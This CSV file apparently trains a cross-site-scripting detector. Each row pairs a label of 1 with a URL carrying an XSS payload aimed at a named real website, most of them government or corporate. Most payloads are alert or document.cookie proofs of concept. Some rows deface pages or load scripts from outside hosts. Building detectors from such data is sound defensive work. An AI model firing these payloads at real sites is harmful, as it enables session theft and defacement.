Sentence,Label
http://forums.amd.com/forum/messageview.cfm?catid=%22%3e%3cbody+onload=document.write(%22xssed%22)%3<br>e,1
http://forums.amd.com/game/index.cfm?ftvar_subcat=258&amp;nocookies=y&amp;subcatname=%22%3e%3cscript%3ealert<br>(%22--daimon--%20%20haha%20amd%20xss%20alert%20:p%22)%3c/script%3e,1
http://customersupport.ea.com/loginapp/login.do?curl=&quot;&gt;&lt;script&gt;alert(/shocker @<br>www.shockingsoft.com/)&lt;/script&gt;,1
http://thesims2.ea.com/help/search.php?key=&quot;&gt;&lt;body onload=&quot;alert('xss')&quot;&gt;,1
http://www.bouticrea.com/shop/search.php?lang=&amp;sort=id&amp;search_query=\%22%3e%3cscript%3ealert(1337)%3<br>c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xerces%3c/h1%3e%3c/marquee%3e&amp;page=0,1
http://www.pauletlea.com/achat/recherche.php?motclef=%22%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e<br>%3cmarquee%3e%3ch1%3exss+by+xerces%3c%2fh1%3e%3c%2fmarquee%3e&amp;imagefield3.x=0&amp;imagefield3.y=0,1
http://www.burningsea.com/ext/motd.php?block_key=&amp;lang=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;a<br>href=&quot;&amp;tab=status,1
http://www.achaea.com/irex/helpview/help.php?q=%22%3e%3cscript%3ealert(%22xss%22)%3c%2fscript%3e&amp;x=h<br>elp,1
http://preferences.fun.ea.com/ea/ea_prefctr.asp?brand=gam&amp;e=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,1
http://simcitysocieties.ea.com/index.php?languagecode=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e,1
http://seeker.bea.com/search?q=%27%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;x=0&amp;y=0&amp;ie=latin1&amp;si<br>te=all&amp;output=xml_no_dtd&amp;client=www&amp;lr=lang_en&amp;proxystylesheet=www&amp;oe=latin1&amp;filter=p&amp;source=www,1
http://www.ea.com/search?keyphrase=&lt;script&gt;alert(/jani/)&lt;/script&gt;,1
http://www.sancarlosbythesea.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,1
http://www.mrenlinea.com/aspr/contact.asp?to=desdibujos@yahoo.com}%3c/style%3e%3cscript%3ea=eval;b=a<br>lert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e,1
http://www.vidsea.com/?p=%3cscript%3ealert(1)%3c%2fscript%3e,1
http://www5.rptea.com/base64/base64.aspx?__viewstate=%2fwepdwujnzu4odazmzazd2qwagidd2qwagihdw8wah4ev<br>gv4daunjyi%2bpc90axrszt48c2nyaxb0pmfszxj0kdezmzcppc9zy3jpchq%2bzgrkbbukpsa8lks70y4klors5ddv4ek%3d&amp;tx<br>tinput=jyi%2bpc90axrszt48c2nyaxb0pmfszxj0kdezmzcppc9zy3jpchq%2b&amp;btndecrypt=base64+to+normal+string&amp;_<br>_eventvalidation=%2fwewbalrpn2adqkt8absbwl0m%2f3ibgldnbn1cv5e2cqkcyc4w3ifuv3%2bzkupegmd,1
http://convivea.com/download.php?id=2&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,1
https://help.ea.com/search?tag=manuals&amp;q=%3cscript%3ealert%28%22xss%22%29%3c/script%3e,1
http://www.nps.gov/pwr/customcf/apps/stream/stream.htm?parkcode=-%200%20--&gt;&lt;img&gt;,1
http://ptwc.weather.gov/ptwc/index.php?region=1&amp;id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,1
"http://innovator.samsungmobile.com/sch/totalsearch.do?platform1=true&amp;platform2=true&amp;platform3=true&amp;p<br>latform4=true&amp;platform5=true&amp;platform12=true&amp;platform13=true&amp;stype=total&amp;topquery=%3cimg%20src=%60ja<br>vascript:alert%28%22rsnake%20says,%20%27xss%27%22%29%60%3e%3e%3cimg%20src=http://media.bigoo.ws/cont<br>ent/christmas/gif_santa_claus/santa_claus_78.gif%20align=center%3e%3c%3ciframe%20width=%22420%22%20h<br>eight=%22315%22%20src=%22http://www.youtube.com/embed/boakprzrkpi%22%20frameborder=%220%22%20allowfu<br>llscreen%3e%3c/iframe%3e",1
http://help.avm.de/fritzbox.php?devicefeatures=%22%3e%3ciframe%20src=http://xssed.com%3e,1
http://www.subway.ru/users/forget_do?forget_login=&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3<br>b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.landrover.fi/default.asp?l=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script&gt;&lt;<br>h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.nutella.ru/recepts/index.php?state=main&amp;event=recept_view&amp;page=0&amp;recept_id=&gt;&quot;&gt;&lt;script%20%<br>0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.data.gouv.fr/content/search?type=data%3c/script%3e%3cscript%3edocument.getelementbyid%28%<br>22headerppal%22%29.innerhtml=%27%3cimg%20src=%22http://www.attendconference.com/blog/wp-content/uplo<br>ads/2011/04/cia.jpg%22%20/%3e%3cp%3eall%20your%20data%20gov%20are%20belong%20to%20you%3c/p%3e%27;%3c<br>/script%3e%3cscript%3e,1
http://www.dharanie.gov.np/listingbychar.php?char=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://bhaktapur.gov.np/listingbychar.php?char=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.jsczfy.gov.cn/sfhm/show.php?error=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.diadiaeducacao.pr.gov.br/portals/frm_login.php?acesso=&amp;origem=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,1
http://www.jnwater.gov.cn/jw_kjxs/index.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.granica.gov.pl/index_czasy.php?p=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.dilg.gov.ph/issuance.php?issuancetype=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://ovt.lcsd.gov.hk/ovt/searchres.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.tjkj.gov.cn/kjssws/querylist.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.chaohu.gov.cn/xzxk.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.xbrc.gov.cn/search/search_job.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.ccga.gov.cn/ssjg.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.wwf.org.za/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,1
http://www.palmeiras.com.br/erro.asp?msg=%3cscript%3ealert%28%22brenn0%22%29%3c/script%3e,1
http://www.wwf.org.my/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;x=0&amp;y=<br>0,1
http://www.wwf.no/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;x=0&amp;<br>y=0,1
http://www.wwf.org.co/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,1
http://www.wwf.org.py/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,1
http://www.jpl.nasa.gov/missions/index.cfm?type=%3cstyle%3ebody{visibility:hidden;}%20html{backgroun<br>d-color:%20black;}%3c/style%3e%27%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%204<br>0px;%e2%80%8b%e2%80%8bz-index:%2010;visibility:%20visible;%20color:%20green;%20font-size:%2040px;%22<br>%3e%3cimg%20src=%22http://img257.imageshack.us/img257/3733/77822687.png%22%20style=%22height:%20300p<br>x;%20width:%20400px;%22%20alt=%22..%22%3e%3cbr%3ewe%20want%20to%20be%20free%3cbr%3e..%3ciframe%20src<br>%20=http://www.youtube.com/watch?v=9hmry8jysdg%22%20width=%220%22%20height=%220%22%20\%3e%3c/div%3e,1
http://www.fedecegeps.qc.ca/index.php?section=14%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e,1
http://crm.pizzahut.co.in/customer_feedback.php?type=%22%3e%3cimg%20src=http://img257.imageshack.us/<br>img257/3733/77822687.png%3e%3c%22,1
http://www.philipmorrisusa.com/redirect.ashx?url=http://xssed.com,1
"http://configure.us.dell.com/dellstore/config.aspx?oc=dndob28&amp;c=us&amp;l=en&amp;s=dhs&amp;cs=19&amp;model_id=inspiro<br>n-15-intel-n5040?oc=i14aw32-a&amp;mboxenv=xss',%20'560',%20'400');alert('by%20@disiqueira_');//",1
http://www.avatarmovie.com/becomeanavatar/index.php?uid=f1e27f7794e2a9850957ad5adea90cbe&amp;n=%3cscript<br>%3ealert%28/zack%20@%20insecurity.ro/%29%3c/script%3e,1
http://www.mfnca.gov.ae/?lang=ar&amp;m=options&amp;act=ministry_inthe_media&amp;cat=33&amp;page=%22%3e%3cscript%3eal<br>ert%28%22true%20promise%20team%20-%20sec-krb.com%22%29%3c/script%3e,1
http://www.yzagri.gov.cn/newssubjectdetail.php?ej=&amp;mainid=1064802412&amp;infoid=&lt;script&gt;alert(/xss/)&lt;/sc<br>ript&gt;,1
http://www.reisebank.de/index.php?id=38&amp;search_type=1&amp;location=%22%3cscript%3ealert(document.cookie)<br>%3c/script%3e,1
http://www.co.pierce.wa.us/cfapps/linx/calendar/getcivilcase.cfm?cause_num=%3c/title%3e%3cscript%3ea<br>lert%28%27xss%20by%20kakia%20-%20kakia.baywords.org%27%29;%3c/script%3e,1
http://tools.seobook.com/server-header-checker/?page=single&amp;url=&lt;script&gt;alert('nanoymaster_waz_ere')<br>;&lt;/script&gt;&amp;useragent=2&amp;typeprotocol=11,1
http://www.huaweidevice.com/worldwide/downloadcenter.do?method=dolistsoftware&amp;id=1&amp;flay=find&amp;softwar<br>ename=&lt;iframe+src=http://www.google.com&gt;&lt;/iframe&gt;,1
http://www.no-ip.com/reactivate-account?email=xss%22%3e%3cscript%20%3ealert%281234%29;%20%3c/script%<br>3e,1
http://www.inps.it/home/default.asp?sid=%3b0%3b&amp;imenu=1&amp;txtstestoricerca=%22%3e%3cscript%3ealert%28%<br>22xss%22%29%3c%2fscript%3e&amp;tiporicerca=11010000&amp;btricerca=trova,1
http://www.turkstat.gov.tr/kp/kullanici/forgotpassword.do?reqcode=pre%3cscript%3ealert(document.cook<br>ie);%3c/script%3epareforgotpasswordform,1
http://robotics.nasa.gov/archive/robot_news.php?year=2005&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://press.catholica.va/news_services/bulletin/bollettino.php?lang=en%22%3e%3c/a%3e%3cscript%3eale<br>rt%281%29;%3c/script%3e%3c%22,1
http://player.rv.va/vaticanplayer01.asp?language=it&amp;visual=%22%3e%3cscript%3ealert%281%29;%3c/script<br>%3e%3c%22,1
http://www.gossip.it/news/monografia.php?keyword=ssasdadas&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,1
http://adesioneonline.ilpopolodellaliberta.it/include/comuni.php?comune=ades.natoa&amp;prov=ades.natopr%<br>0a%3cscript%3ealert%281%29%3c/script%3e%0a&amp;id=ades.idcomunens&amp;stato=ades.statonato&amp;label=1&amp;idprovv=a<br>des.idprovnascita,1
http://www.wbphed.gov.in/applications/map_mnt/search.php?catagory=%27%22%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,1
http://www.bloombergutv.com/search.php?tag=%27%27%22%3e%3c/title%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,1
http://www.westbengaltourism.gov.in/application/img_maint/search.php?catagory=%22%3e%3cscript%3ealer<br>t(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marq<br>uee%3e,1
http://www.fdsindh.gov.pk/site/search.php?keyword=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,1
http://www.secretariadeambiente.gov.co/sda/libreria/php/noticias08.php?id=%22%3e%3cscript%3ealert(do<br>cument.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%<br>3e,1
http://www.zzxq.gov.cn/demo/zzxq_searchweb_result.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,1
http://www.millingtontn.gov/cgi-bin/ksearch/ksearch.cgi?p=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.osc.gov/cgi-bin/ksearch/ksearch.cgi?p=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.hbdrc.gov.cn/search.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://www.avellaneda-ba.gov.ar/index.php?idcateg=50&amp;level=%22%3e%3ciframe%20onload=alert%28/xss/%29<br>%3e,1
http://search.sonypictures.com/search?q=%22%3balert%28%27xss%27%29%3b%2f%2f&amp;output=xml_no_dtd&amp;filter<br>=p&amp;getfields=*&amp;client=sp-us&amp;proxystylesheet=sp-us&amp;site=sp-us,1
http://www.mmi.gov.cn/index.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
"http://www.jobs.ie/jobs.aspx?categories=&amp;regions=&amp;keywords=';alert(string.fromcharcode(88,83,83))//\<br>';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.from<br>charcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",1
http://topsy.com/s?q=%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,1
http://www.wuxuan.gov.cn/news_show.asp?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
http://www.yzghj.gov.cn/lxtd.asp?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
http://www.idecaf.gov.vn/detail.php?lang=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
"http://www.itst.gov.vn/index.php/mod,search/task,dosearch/?keyword=%22%3e%3cscript%3ealert%28%2far3s<br>w0rmed%2f%29%3b%3c%2fscript%3e",1
http://www.dqedu.gov.cn/search.php?searchword=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,1
http://www.hr.gov.cn/search.php?searchword=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,1
http://www.cgcc.gov.cn/news_view.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
http://www.dyjy.gov.cn/articleshow.php?id=12400%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%<br>3e%20:%20%20xss%20vulnerable,1
http://ancienthistory.about.com/sitesearch.htm?terms=asd&amp;suname=%22%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,1
http://www.agc.army.mil/index.cfm?searchstring=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e&amp;input=search,1
http://www.webmasterworld.com/redirect.cgi?f=88&amp;d=4039&amp;url=http://google.com,1
http://www.cbs12.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,1
http://www.cbs6albany.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,1
http://www.newsherald.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,1
http://www.veloute.fr/fruix-ton-sourire/%3c%3cscript%3ealert%28%22vache%20qui%20rit%20!%22%29;//%3c%<br>3c/script%3e,1
https://ib.cim-italia.it/helpcenter/opencms/helpcenter/&lt;script&gt;alert(document.cookie);&lt;/script&gt;bpb/bpb/trova.jsp,1
http://uavsar.jpl.nasa.gov/cgi-bin/data.pl?itext=1%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,1
http://support.citrix.com/search/advanced?searchquery=test&amp;contenttypes=product+documentation&amp;conten<br>ttypes=hotfixes&amp;contenttypes=learning+center&amp;contenttypes=tools+and+resources&amp;contenttypes=how-to+vi<br>deos&amp;contenttypes=customer+service&amp;contenttypes=technotes&amp;topic=&amp;product=xenserver&amp;version=xenserver<br>+5.0&quot;; &lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;languages=en&amp;modifiedwhen=,1
http://www.platines.sante.gouv.fr/?fi=&amp;ville=&amp;etablissement=&amp;depa=&amp;regi=&amp;typo=&amp;fiche=&amp;statut=&amp;scanne<br>r=&amp;irm=&amp;cam_scint=&amp;tep=&amp;salle_hemo=&amp;salle_coro=&amp;maternite=&amp;maternite1=&amp;maternite2=&amp;maternite3=&amp;struc<br>t_urgence=&amp;reanimation=&amp;brule=&amp;chir_cardiaque=&amp;neuro=&amp;radio=&amp;chimio=&amp;dialyse=&amp;readaptation=&amp;afficher<br>=o&amp;etablissement=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,1
http://www.irep.ecologie.gouv.fr/irep/quickresult.php?saveget=1&amp;strrecherche=/&quot;&gt;&lt;script&gt;alert(1)&lt;/sc<br>ript&gt;,1
http://itrf.ensg.ign.fr/itrf_solutions/2005/itrf2005_files.php?page=2/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
http://concours.fonction-publique.gouv.fr/gcp/pages/enginename/search/score;jsessionid=386b36e4d271b<br>e6b5f753edffa7b61b4.pp22?pagesearchresultbuilder.onlyonehitbypage=true&amp;searchview=simple&amp;maxpageitem<br>s=15&amp;search=&amp;withoutwordsearch=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
http://www.oncfs.gouv.fr/spip.php?page=recherche&amp;recherche=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,1
http://www.etalab.gouv.fr/recherche/?query=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,1
http://www.sportsdenature.gouv.fr/fr/actualite-proposition.cfm?cat=40/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,1
http://www.greenpeace.fr/incinerateurs/list.php?list_name=pays-de-la-loire&amp;filter_dpt=/&quot;&gt;&lt;script&gt;ale<br>rt(1)&lt;/script&gt;&lt;script src=http://atmoner.com/xss.atmon3r.js&gt;&lt;/script&gt;,1
http://www.francesoir.fr/search/apachesolr_search/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,1
http://bifp.fonction-publique.gouv.fr/search?advanced=1&amp;text=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,1
"http://football-regional.lesoir.be/live/index.php?compet=--%3e%3cscript%3ealert%28string.fromcharcod<br>e%2835,32,32,66,101,108,103,105,97,110,32,83,101,99,117,114,105,116,121,32,32,35%29%29%3c/script%3e",1
http://www.mayoclinic.com/health/diseaselistpage/diseaselistpage/letter=%22%3e%3cscript%3ealert(1)%3<br>c/script%3e,1
http://www.howstuffworks.com/framed.htm?url=javascript:alert(1);,1
http://www.redtube.com/?page='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
http://www.redtube.com/?search=blerg%27+onmouseover%3djavascript:alert%28document.cookie%29+'%3e,1
http://exclusive.redtube.com/search.php?s=11293|0|838|15|wide|0&amp;lg=us&amp;actor_id=%22%3e%3cscript%3eale<br>rt(%22daimon%22)%3c/script%3e,1
http://www.durham.gov.uk/durhamcc/trawler.nsf/searchresultstemplate?openform&amp;query=%22%3e%3cscript%3<br>ealert(/xss+-+thedefaced.org/)%3c/script%3e,1
http://www.ciberdocencia.gob.pe/index.php?cat=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3<br>e,1
http://www.bulacan.gov.ph/tourism/touristspotpostfeedback.php?id=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/scr<br>ipt&gt;,1
http://recherche.lejournaldemontreal.canoe.ca/?sen=montreal&amp;ie=utf-8&amp;q=asd%22%2f%3e%3cscript%3ealert<br>%28document.cookie%29%3b%3c%2fscript%3e,1
http://www.bancomeridian.com/atencion_al_cliente.php?ln=&quot;&gt;&lt;script&gt;alert(/xssed by<br>ar3sw0rmed/);&lt;/script&gt;,1
http://bvs.minsa.gob.pe/php/bvsnet.php?lang=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,1
http://www.mpfn.gob.pe/prensa-detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
http://www.fitel.gob.pe/contenido.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,1
http://www.turismoruralperu.gob.pe/index.php?fp_plantilla_seleccionada_temporal=82%22%3e%3cscript%3e<br>alert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,1
http://ar.gov.ru/en/main_menu_en/news-events/index.php?m2=all&amp;amp;np2=579&amp;amp;ps2=10&amp;amp;q2=corrupti<br>on%22&amp;amp;sp2=1&amp;amp;sy2=1&amp;amp;ul2=http://ar.gov.ru/&amp;amp;wf2=2221&amp;amp;wm2=%22%3e%3c/script%3e%3cscrip<br>t%3ealert%28document.cookie%29%3c/script%3e%3cscript%3ealert%28/xssed%20by%20ar3sw0rmed/%29;%3c/scri<br>pt%3e,1
http://sitl.diputados.gob.mx/lxi_leg/curricula.php?dipt=&quot;&gt;&lt;script&gt;alert(/xssed by<br>ar3sw0rmed/);&lt;/script&gt;,1
"http://www.unicef.si/forum/emailform.asp?to=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert(12345,43122<br>32292)%3b%uff1c/script%uff1e",1
http://vijayabank.com/vijaya/vijaya/internet-en/menus/branch-search/branch_search_display.jsp?stview<br>=1&amp;edview=10&amp;currentpg=1&amp;search=branch%20name&amp;search_element=%3ciframe%20src=%22http://xssed.com%22%<br>3e,1
http://www.cs.princeton.edu/research/techreps/%22%3e%3c/script%3e%3cscript%3ealert%28document.cookie<br>%29%3c/script%3e%3cscript%3ealert%28/xssed%20by%20ar3sw0rmed/%29;%3c/script%3e,1
http://www.aljazeera.net/photogallery/aspx/show.aspx?currentpage=&lt;script&gt;alert('shockshadow was<br>h3r3\nhttp://yee7.com');&lt;/script&gt;,1
http://www.untj.org/?c=12&amp;id=&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower%20-%20from%20turkey/)%3b&lt;<br>/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;&lt;/marquee,1
http://www.jugements.qc.ca/index.php?type=listemc&amp;recher=0_%3cscript%3ealert%28document.cookie%29%3c<br>%2fscript%3e_0__pert,1
"http://www.msz.gov.pl/archiwa,i,rejestry,5513%22%3e%3cdiv%20style=z-index:1000;width:2000px;height:2<br>000px;background:black;color:lime;position:absolute;top:50px;padding:100px;left:100px;font-size:50px<br>%3exss%20by%20nevillon%20-%20devilteam%20quad%3cbr%20%3e%3cfont%20color=black%20size=%22.html",1
http://www.audi.ua/modell_start.php?k_id=%3e%22%3e%3cscript%20%0a%0d%3ealert(/xss%20by%20turkpower%2<br>0-%20from%20turkey/)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%3c/h1%3e%3c/mar<br>quee%3e,1
http://www.peugeot.ua/ru/zapchasty/1022/action=1&amp;captcha=2691&amp;fio=%3e%22%3e%3cscript%20%0a%0d%3ealer<br>t(/xss%20by%20turkpower%20-%20from%20turkey/)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from<br>%20turkey%3c/h1%3e%3c/marquee%3e,1
http://www.nissan.com.sg/contactus/contactus.cfm?error=&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%<br>20-%20from%20turkey')%3b&lt;/script&gt;&amp;type=1,1
http://www.axa.com.ph/contact_us-complaints.asp?subj=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower<br>%20-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;,1
http://www.aksaray.gov.tr/yonetim/kat.asp?k=&lt;iframe%20src=&quot;http://www.xssed.com/archive/author=turkp<br>ower/&quot;&gt;,1
http://www.hakkari.gov.tr/haberler.asp?id=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(document.cookie)%3b&lt;/script&gt;&amp;shf<br>=1,1
http://www.mardin.gov.tr/haber/haberler.asp?kategori=&lt;iframe%20src=&quot;http://www.xssed.com/archive/aut<br>hor=turkpower/&quot;&gt;,1
https://www.co.cc/notice/notice.php?a=%3cscript%3ealert(123);%3c/script%3e,1
http://www.sipa.gov.ba/bs/img_prikaz.php?img=web&amp;img_title=%3ch1%3eowned%20by%20netmafia%3c/h1%3e%3c<br>img%20src=http://img14.imageshack.us/img14/3479/hackede.png%3e,1
https://www.co.cc/regist/regist_account.php?go_url=%5c%27%3e%3cscript%3ealert%28123%29%3b%3c%2fscrip<br>t%3e,1
http://www.vidporn.co.cc/index.php/%3e%22%3e%3cscript%20src=http://sasan-jackson.persiangig.com/xss.<br>js%3e%3c/script%3e,1
http://indoscripts.co.cc/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,1
http://www.red-revenge.co.cc/arama.php?haber_baslik=&lt;script%20src=http://hackspy.awardspace.biz/hack<br>spy.js&gt;&lt;/script&gt;,1
http://ghack.nugeloganteng.co.cc/index.php?ref=&quot;&gt;&lt;script&gt;alert(&quot;you guys are retarded&quot;)&lt;/script&gt;,1
http://urlmx.co.cc/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,1
http://www.nokia.co.uk/search4/index.jsp?wsid=207&amp;charset=iso-8859-1&amp;qt=%3ca+href%3djavascript%3aale<br>rt%28%27fuzz%27%29%3ebackslash+security+%3c%2fa%3e&amp;go.x=21&amp;go.y=10&amp;go=go,1
http://sourceforge.net/top/topalltime.php?type=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,1
http://sourceforge.net/top/toplist.php?type=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,1
http://eskuel.sourceforge.net/eskuel/phpinfo.php?a[]=%3cscript%3ealert(123)%3c/script%3e,1
